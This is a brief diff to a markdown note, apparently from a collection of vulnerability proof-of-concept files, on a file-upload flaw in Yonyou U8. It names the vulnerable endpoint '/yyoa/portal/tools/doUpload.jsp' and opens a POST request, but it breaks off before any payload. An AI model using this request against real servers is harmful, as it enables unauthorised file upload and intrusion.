@@ -1,7 +1,7 @@
 # yonyou_u8_doupload_fileupload
 
 from : https://mp.weixin.qq.com/s/cLY9PoKGSQ_-g6x75DoHNQ
-2024.2.26 @@
+2024.2.26 @2
 ```
 POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
 Host: 127.0.0.1
